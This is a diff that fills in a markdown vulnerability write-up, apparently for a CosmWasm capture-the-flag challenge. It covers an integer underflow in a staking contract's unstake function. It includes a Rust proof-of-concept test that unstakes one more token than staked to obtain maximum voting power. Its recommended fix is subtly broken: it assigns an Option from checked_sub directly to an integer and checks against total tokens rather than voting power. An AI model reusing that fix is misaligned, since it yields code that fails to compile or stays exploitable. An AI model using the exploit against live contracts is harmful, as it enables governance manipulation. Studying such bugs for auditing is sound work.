@@ -5,7 +5,7 @@
 ### Description
 
 Hello guys my name is Jess I am a security researcher mostly in the area of Windows binary exploitation.
-I think the isse in this challenge, is that in the withraw() function in contract.rs, on L#94, you can
+I think the issue in this challenge, is that in the withdraw() function in contract.rs, on L#94, you can
 claim multiple times for the same ID. You could fix this by keeping a list of unlocked lockup ids, and
 return Err if this list contains the lockup.id
 
@@ -98,16 +98,176 @@ contract.rs:
 
 ### Description
 
-The bug occurs in ...
+One mistake people make surprisingly often is to assume that Rust guards against integer underflow/overflow.
+The result of an arithmetic operation in Rust *can not be undefined* due to its strict type semantics.
+So the compiler will perform static checks, but can't assume the result of addition or subtraction at runtime.
+Any additional runtime checks which rustc would add incur additional overhead, so they must be made explicit
+in Cargo.toml if you want to advantage of them. This is an understandable oversight especially for developers
+coming from the world of Solidity smart contracts (where type safety and optimization are sometimes not a priority).
+
+
+I observe first of all that this is the release profile in Cargo.toml (note the last setting particularly)
+[this is the default for release profile, as well](https://doc.rust-lang.org/cargo/reference/profiles.html)
+```
+[profile.release]
+opt-level = 3
+debug = false
+rpath = false
+lto = true
+debug-assertions = false
+codegen-units = 1
+panic = 'abort'
+incremental = false
+overflow-checks = false
+```
+
+And next I see that unstake does not check the unlock_amount (which is arbitrary user input) against the
+user.total_tokens:
+```rust
+/// Entry point for users to decrease voting power
+pub fn unstake(
+    deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    unlock_amount: u128,
+) -> Result<Response, ContractError> {
+    // decrease voting power
+    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();
+
+    // check release time
+    if env.block.time < user.released_time {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    user.voting_power -= unlock_amount;
+```
+
+Thus you can violate the program invariant that stake < total tokens, which is assumed here on L#105:
+    // cannot stake more than total tokens
+We can fix this by adding additional sanity checks! Or we can use checked_sub instead of -=. Or both!
+
+[Here](https://www.sec3.dev/blog/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts) is a blog from the fine folks at sec3 about the issue. It mostly concerns solana programs, but the
+same idea applies here for cosmwasm!
+
 
 ### Recommendation
 
-The fix should be ...
+```rust
+/// Entry point for users to decrease voting power
+pub fn unstake(
+    deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    unlock_amount: u128,
+) -> Result<Response, ContractError> {
+    // decrease voting power
+    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();
+
+    // check release time
+    if env.block.time < user.released_time {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    // cannot UNstake more than total tokens
+    if unlock_amount > user.total_tokens.u128() {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    user.voting_power = user.voting_power.checked_sub(unlock_amount);
+
+    VOTING_POWER
+        .save(deps.storage, &info.sender, &user)
+        .unwrap();
+
+    Ok(Response::new()
+        .add_attribute("action", "unstake")
+        .add_attribute("unlock_amount", unlock_amount.to_string())
+        .add_attribute("user.voting_power", user.voting_power.to_string()))
+}
+```
+And maybe change the release profile to be overflow-checks = true if we don't mind the overhead
 
 ### Proof of concept
+Tests can give people a false sense of confidence. If your test does not reflect the release environment,
+its results may not catch bugs which surface in production
+
+If we run this with cargo's default test profile (ie with debug assertions enabled and optimizations disabled),
+it will fail. However, if we run it with cargo test --release then it will pass:
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        let amount = Uint128::new(1_000);
+
+        app = mint_tokens(app, USER.to_string(), amount);
+        let sender = Addr::unchecked(USER);
+
+        // deposit funds
+        let msg = ExecuteMsg::Deposit {};
+        app.execute_contract(
+            sender.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(amount.u128(), DENOM)],
+        )
+        .unwrap();
+
+        // no funds left
+        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        assert_eq!(balance, Uint128::zero());
+
+        // query user
+        let msg = QueryMsg::GetUser {
+            user: (&USER).to_string(),
+        };
+        let user: UserInfo = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(user.total_tokens, amount);
+
+        // normal stake
+        let msg = ExecuteMsg::Stake {
+            lock_amount: amount.u128(),
+        };
+        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // query voting power
+        let msg = QueryMsg::GetVotingPower {
+            user: (&USER).to_string(),
+        };
+        let voting_power: u128 = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(voting_power, amount.u128());
+
+        // fast forward time
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // evil unstake
+        let msg = ExecuteMsg::Unstake {
+            // -1 should give us u128::MAX voting_power
+            unlock_amount: amount.u128() + 1,
+        };
+        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // hella voting power
+        let msg = QueryMsg::GetVotingPower {
+            user: (&USER).to_string(),
+        };
+        let voting_power: u128 = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(voting_power, u128::MAX);
+    }
 ```
 
 ---
